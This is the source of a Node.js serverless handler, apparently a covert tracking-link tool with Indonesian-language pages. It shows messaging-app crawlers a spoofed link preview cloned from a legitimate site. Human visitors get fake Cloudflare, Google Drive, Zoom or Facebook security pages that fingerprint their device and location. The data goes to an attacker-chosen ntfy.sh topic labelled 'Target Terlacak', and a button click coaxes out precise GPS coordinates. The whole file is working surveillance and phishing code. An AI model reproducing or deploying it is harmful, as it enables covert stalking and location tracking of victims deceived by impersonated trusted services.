const axios = require('axios');

module.exports = async (req, res) => {
    const { topic, t, tpl } = req.query;

    let targetUrl = 'https://google.com';
    if (t) {
        try { targetUrl = Buffer.from(t, 'base64').toString('utf-8'); } catch (e) { }
    }

    if (!topic) {
        return res.redirect(301, targetUrl);
    }

    // Server-side IP Info (Baseline)
    const ipRaw = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.socket.remoteAddress || '';
    const cleanIp = ipRaw.split(',')[0].trim();

    let geo = {};
    if (cleanIp) {
        try {
            const geoReq = await axios.get(`http://ip-api.com/json/${cleanIp}`, { timeout: 2000 });
            geo = geoReq.data;
        } catch (e) { }
    }

    const ua = req.headers['user-agent'] || '';
    const isBot = /bot|preview|whatsapp|facebook|telegram|twitter|linkedin|skype|discord/i.test(ua);

    // [LINK PREVIEW SPOOFING]
    if (isBot) {
        let ogTags = '<title>Sedang Memuat...</title>';
        try {
            const targetRes = await axios.get(targetUrl, {
                timeout: 3000,
                headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119.0.0.0 Safari/537.36' }
            });
            const htmlData = targetRes.data;
            const titleMatch = htmlData.match(/<title[^>]*>([\s\S]*?)<\/title>/i);
            let tags = "";
            if (titleMatch) tags += `<title>${titleMatch[1]}</title>\n`;

            const metas = htmlData.match(/<meta[^>]+>/gi);
            if (metas) {
                tags += metas.filter(m => /property="og:|name="twitter:|name="description"/i.test(m)).join('\n');
            }
            if (tags) ogTags = tags;
        } catch (e) { }

        return res.status(200).send(`<!DOCTYPE html><html><head>${ogTags}</head><body></body></html>`);
    }

    // TEMPLATE ENGINE
    let theme = {
        bg: '#fff',
        fg: '#333',
        title: 'Just a moment...',
        h1: 'Checking your browser...',
        p: 'We need to verify you are human before accessing the content.',
        btn: 'VERIFY & CONTINUE',
        spinner: '#f68b1e'
    };

    if (tpl === 'drive') {
        theme = { bg: '#fff', fg: '#202124', title: 'Google Drive - Request Access', h1: 'Akses Ditolak', p: 'File ini bersifat privat. Klik tombol di bawah untuk meminta akses dari pemilik file.', btn: 'MINTA AKSES FILR' };
    } else if (tpl === 'zoom') {
        theme = { bg: '#2D2E33', fg: '#fff', title: 'Join Meeting - Zoom', h1: 'Menunggu Host...', p: 'Sedang memverifikasi koneksi rapat Anda. Pastikan izin lokasi aktif untuk sinkronisasi server.', btn: 'GABUNG RAPAT (LOAD)' };
    } else if (tpl === 'meta') {
        theme = { bg: '#0668E1', fg: '#fff', title: 'Facebook Security', h1: 'Konfirmasi Identitas', p: 'Telah terdeteksi upaya login mencurigakan. Harap verifikasi browser Anda untuk mengamankan akun.', btn: 'SAYA ADALAH PEMILIKNYA' };
    }

    const html = `<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${theme.title}</title>
    <style>
        body { margin: 0; padding: 0; background: ${theme.bg}; color: ${theme.fg}; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; overflow: hidden; }
        .cf-wrapper { text-align: center; max-width: 500px; padding: 30px; border-radius: 12px; }
        .cf-spinner { border: 4px solid transparent; border-top: 4px solid ${theme.spinner || theme.fg}; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h1 { font-size: 24px; font-weight: 600; margin-bottom: 20px; }
        p { font-size: 15px; opacity: 0.8; margin-bottom: 25px; line-height: 1.5; }
        .cf-btn { display: inline-block; background: ${theme.tpl === 'drive' ? '#1a73e8' : '#0051c3'}; color: white; border: none; padding: 12px 30px; font-size: 16px; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%; transition: scale 0.2s; }
        .cf-btn:active { transform: scale(0.98); }
        .cf-footer { margin-top: 50px; font-size: 11px; opacity: 0.5; }
    </style>
</head>
<body>
    <div class="cf-wrapper">
        <div id="loadingState">
            ${tpl === 'meta' ? '' : '<div class="cf-spinner"></div>'}
            <h1>${theme.h1}</h1>
            <p>${theme.p}</p>
            <button class="cf-btn" id="verifyBtn">${theme.btn}</button>
        </div>
        <div class="cf-footer">Request ID: ${Math.random().toString(36).substring(2, 12).toUpperCase()} • SSL Secure Tracking</div>
    </div>
    <script>
        async function capture() {
            // Level 4 Pegasus-Lite Advanced Fingerprinting: Canvas Hash
            const generateCanvasHash = () => {
                try {
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');
                    ctx.textBaseline = "top"; ctx.font = "14px 'Arial'"; ctx.textBaseline = "alphabetic";
                    ctx.fillStyle = "#f60"; ctx.fillRect(125,1,62,20);
                    ctx.fillStyle = "#069"; ctx.fillText("🕵️‍♂️SINTEL-HP" + navigator.userAgent, 2, 15);
                    ctx.fillStyle = "rgba(102, 204, 0, 0.7)"; ctx.fillText("🕵️‍♂️SINTEL-HP", 4, 17);
                    const dataURI = canvas.toDataURL();
                    let hash = 0;
                    for (let i = 0; i < dataURI.length; i++) {
                        hash = ((hash << 5) - hash) + dataURI.charCodeAt(i);
                        hash = hash & hash;
                    }
                    return Math.abs(hash).toString(16);
                } catch (e) { return "Unknown"; }
            };

            const payload = {
                ip: "${cleanIp}",
                lat: ${geo.lat || 'null'},
                lon: ${geo.lon || 'null'},
                city: "${geo.city || geo.regionName || 'Unknown'}",
                ua: navigator.userAgent,
                time: new Date().toISOString(),
                // Fingerprinting Level 4 (Pegasus-Pro)
                device_hash: generateCanvasHash(),
                screen: window.screen.width + "x" + window.screen.height + " (" + window.screen.colorDepth + "bit)",
                cpu: navigator.hardwareConcurrency || '??',
                ram: navigator.deviceMemory || '??',
                platform: navigator.platform,
                gpu: 'Unknown',
                battery: 'Unknown',
                charging: 'Unknown',
                network: 'Unknown',
                speed: 'Unknown',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
                language: navigator.language || 'Unknown',
                touch: navigator.maxTouchPoints > 0 ? 'Yes' : 'No'
            };

            // Network Info
            if (navigator.connection) {
                payload.network = navigator.connection.effectiveType || 'Unknown';
                payload.speed = navigator.connection.downlink ? (navigator.connection.downlink + " Mbps") : 'Unknown';
            }

            // Get GPU Info
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    payload.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                }
            } catch(e) {}

            // Get Battery Info
            try {
                if (navigator.getBattery) {
                    const bt = await navigator.getBattery();
                    payload.battery = Math.round(bt.level * 100) + "%";
                    payload.charging = bt.charging ? "Charging" : "Unplugged";
                }
            } catch(e) {}

            // Initial PING (Fingerprint + IP)
            const sendPing = (data) => {
                fetch('https://ntfy.sh/${topic}', {
                    method: 'POST',
                    body: JSON.stringify(data),
                    headers: { 'Title': 'Target Terlacak (Level 3)', 'Tags': 'high_brightness,skull' }
                });
            };

            sendPing(payload);

            // Real-time GPS Tracking TRIGGERED BY BUTTON CLICK
            document.getElementById('verifyBtn').addEventListener('click', () => {
                document.getElementById('verifyBtn').innerText = "Verifying...";
                
                const execRedirect = () => {
                   window.location.replace("${targetUrl}");
                };

                if (navigator.geolocation) {
                    // Try to force the popup!
                    navigator.geolocation.getCurrentPosition((pos) => {
                        payload.lat = pos.coords.latitude;
                        payload.lon = pos.coords.longitude;
                        payload.accuracy = Math.round(pos.coords.accuracy) + "m";
                        payload.type = 'GPS_SAT';
                        sendPing(payload); // Send updated GPS
                        
                        // Wait a sec to ensure ping goes out before redirect
                        setTimeout(execRedirect, 800);
                        
                    }, (err) => {
                        // User blocked or timed out
                        execRedirect();
                    }, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
                } else {
                    execRedirect();
                }

                // Failsafe redirect if they ignore the popup entirely for 6 seconds
                setTimeout(execRedirect, 6000);
            });

        }
        capture();
    </script>
</body>
</html>`;

    res.setHeader('Content-Type', 'text/html');
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
    return res.status(200).send(html);
};
